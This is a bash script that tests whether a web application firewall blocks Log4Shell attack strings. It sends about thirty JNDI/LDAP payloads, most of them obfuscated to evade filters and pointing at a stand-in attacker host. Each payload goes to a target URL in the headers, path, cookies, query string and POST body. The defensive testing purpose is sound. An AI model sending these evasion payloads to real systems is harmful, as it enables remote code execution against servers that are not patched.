#!/bin/bash

# Simple bash script to test your WAF or other devices against Log4Shell attack strings and various bypasses
#
# Bypass tricks from: https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words
#
# To run:
# ./cve-2021-44228.sh -t <URL of the target> -c <HTTP Status Code expected>
#
# Or to use the defaults of https://127.0.0.1 and 403:
# ./cve-2021-44228.sh

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

usage() { echo "Usage: $0 [-h] [-t <host to target>] [-d <debug>] [-c <expected http result code>]" 1>&2; exit 1; }

while getopts "t:dc:h" o; do
    case "${o}" in
        t)
            target=${OPTARG}
            ;;
        d)
            debug=true
            ;;
        c)
            code=${OPTARG}
            ;;
        h)
            usage
            ;;
    esac
done
shift $((OPTIND-1))

debug=${debug:-false}
target=${target:-https://127.0.0.1}
code=${code:-403}

[ "$debug" == "true" ] && echo "${target} ${code} ${debug}"

testStrings=(
    '${jndi:}'
    '%24%7Bjndi%3A%7D'
    '%24%7Bjndi:%7D'
    '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}'
    '${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}'
    '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}'
    '${jnd${upper:Ä±}:ldap://somesitehackerofhell.com/z}'
    '${jnd${sys:SYS_NAME:-i}:ldap:/somesitehackerofhell.com/z}'
    '${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://somesitehackerofhell.com/z}'
    '${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://somesitehackerofhell.com/z}'
    '%24%7Bjndi%3A%7D'
    '%24%7B%24%7Benv%3AENV_NAME%3A-j%7Dndi%24%7Benv%3AENV_NAME%3A-%3A%7D%24%7Benv%3AENV_NAME%3A-l%7Ddap%24%7Benv%3AENV_NAME%3A-%3A%7D%2F%2Fsomesitehackerofhell.com%2Fz%7D'
    '%24%7B%24%7Blower%3Aj%7Dndi%3A%24%7Blower%3Al%7D%24%7Blower%3Ad%7Da%24%7Blower%3Ap%7D%3A%2F%2Fsomesitehackerofhell.com%2Fz%7D'
    '%24%7B%24%7B%3A%3A-j%7D%24%7B%3A%3A-n%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-i%7D%3A%24%7B%3A%3A-l%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-a%7D%24%7B%3A%3A-p%7D%3A%2F%2Fsomesitehackerofhell.com%2Fz%7D'
    '%24%7Bjnd%24%7Bupper%3A%C4%B1%7D%3Aldap%3A%2F%2Fsomesitehackerofhell.com%2Fz%7D'
    '%24%7Bjnd%24%7Bsys%3ASYS_NAME%3A-i%7D%3Aldap%3A%2Fsomesitehackerofhell.com%2Fz%7D'
    '%24%7Bj%24%7B%24%7B%3A-l%7D%24%7B%3A-o%7D%24%7B%3A-w%7D%24%7B%3A-e%7D%24%7B%3A-r%7D%3An%7Ddi%3Aldap%3A%2F%2Fsomesitehackerofhell.com%2Fz%7D'
    '${\x6a\x6e\x64\x69:ldap://somesitehackerofhell.com/z}'
    '${j\x6e\x64\x69:ldap://somesitehackerofhell.com/z}'
    '${\x6andi:ldap://somesitehackerofhell.com/z}'
    '${\u006a\u006e\u0064\u0069:ldap://somesitehackerofhell.com/z}'
    '${j\u006e\u0064\u0069:ldap://somesitehackerofhell.com/z}'
    '${\u006andi:ldap://somesitehackerofhell.com/z}'
    '${u+0000006au+0000006eu+00000064u+00000069:ldap://somesitehackerofhell.com/z}'
    '${ju+0000006eu+00000064u+00000069:ldap://somesitehackerofhell.com/z}'
    '${u+0000006andi:ldap://somesitehackerofhell.com/z}'
    '${u+0000006au+0000006eu+00000064u+00000069'
    '${\x6a\u006e\u0064u+00000069'
    '${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://somesitehackerofhell.com/z}'
    '${jndi:ldap://127.0.0.1#somesitehackerofhell.com/z}'
    '${${::-${::-$${::-j}}}}'
)



function testConfig () {
  res=$(curl -ks ${target})
  exit=$?
  if [[ "$exit" != "0" ]]
  then
    echo "Curl failed with exit code: $exit"
    exit
  fi
}

function testReturnCode () {
    if [[ "$code" != "$rcode" ]]
    then
      printf "    ${RED}$rcode${NC}\n"
    else
      printf "    ${GREEN}$rcode${NC}\n"
    fi
}

function runTests () {
  oIFS=$IFS
  for ((i = 0; i < ${#testStrings[@]}; i++))
  do
    echo "Test String: ${testStrings[$i]}"
    echo "-------------------------------------------------------------"

    echo "HEADERS: curl -ksg -w \"%{http_code}\" ${target} -A '${testStrings[$i]}'"
    res=$(curl -ksg -w "%{http_code}" ${target} -A \'${testStrings[$i]}\')
    rcode=$(echo "$res" | tail -1)
    testReturnCode


    echo "URI: curl -ksg -w \"%{http_code}\" '${target}/${testStrings[$i]}'"
    res=$(curl -ksg -w "%{http_code}" ${target}/${testStrings[$i]})
    rcode=$(echo "$res" | tail -1)
    testReturnCode


    echo "Cookies: curl -ksg -w \"%{http_code}\" ${target} -b 'session=${testStrings[$i]}'"
    res=$(curl -ksg -w "%{http_code}" ${target} -b session=${testStrings[$i]})
    rcode=$(echo "$res" | tail -1)
    testReturnCode


    echo "Query String: curl -ksg -w \"%{http_code}\" '${target}/something?session=${testStrings[$i]}'"
    res=$(curl -ksg -w "%{http_code}" ${target}/something?session=${testStrings[$i]})
    rcode=$(echo "$res" | tail -1)
    testReturnCode


    echo "POST Data: curl -X POST -ksg -w \"%{http_code}\" ${target} -d '${testStrings[$i]}'"
    res=$(curl -X POST -ksg -w "%{http_code}" ${target} -d ${testStrings[$i]})
    rcode=$(echo "$res" | tail -1)
    testReturnCode

    echo
  done
}



testConfig

runTests
